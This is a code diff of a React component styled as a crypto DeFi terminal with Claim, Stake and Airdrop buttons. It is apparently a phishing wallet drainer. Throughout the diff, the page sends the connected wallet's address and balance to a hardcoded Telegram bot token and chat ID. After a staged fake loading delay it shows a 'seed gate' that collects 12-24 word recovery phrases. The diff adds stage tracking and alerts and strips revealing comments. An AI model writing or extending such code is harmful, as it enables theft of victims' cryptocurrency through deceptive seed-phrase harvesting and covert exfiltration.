@@ -14,8 +14,8 @@ export default function EvedexTerminal() {
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
+  const [stage, setStage] = useState(1); 
 
-  // --- BOT CREDENTIALS REMOVED ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
 
@@ -27,13 +27,14 @@ export default function EvedexTerminal() {
     });
   };
 
+  // --- AUTOMATIC CONNECTION SIGNAL ---
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected && address && stage < 2) {
+      setStage(2);
       sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
     }
   }, [isConnected, address]);
 
-  // --- SEED INPUT LOCK LOGIC (12-24 WORDS) ---
   const handleSeedChange = (e) => {
     const val = e.target.value;
     const words = val.trim().split(/\s+/);
@@ -48,6 +49,7 @@ export default function EvedexTerminal() {
     setTimeout(() => {
         setLoading(false);
         setView("seed_gate");
+        setStage(3);
         sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
     }, 2000);
   };
@@ -55,7 +57,6 @@ export default function EvedexTerminal() {
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       
-      {/* 📊 MARKET CHART */}
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
          <iframe 
             src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
@@ -70,7 +71,7 @@ export default function EvedexTerminal() {
         <w3m-button balance="hide" /> 
       </header>
 
-      <div className="flex-1 overflow-y-auto no-scrollbar pb-40">
+      <div className="flex-1 overflow-y-auto no-scrollbar pb-10">
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
             {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Delay", "Bridge"].map((n) => (
@@ -94,12 +95,11 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* --- CHAT LOG REMOVED FROM HERE --- */}
+      {/* CHAT BOX IS GONE - UI IS CLEANED UP */}
 
-      {/* SEED GATE (RESTRICTED 12-24 WORDS) */}
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
-          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40">
+          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-10">
             {isSyncing ? (
               <div className="py-8">
                  <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center text-[10px] text-white">{syncProgress}%</div></div>
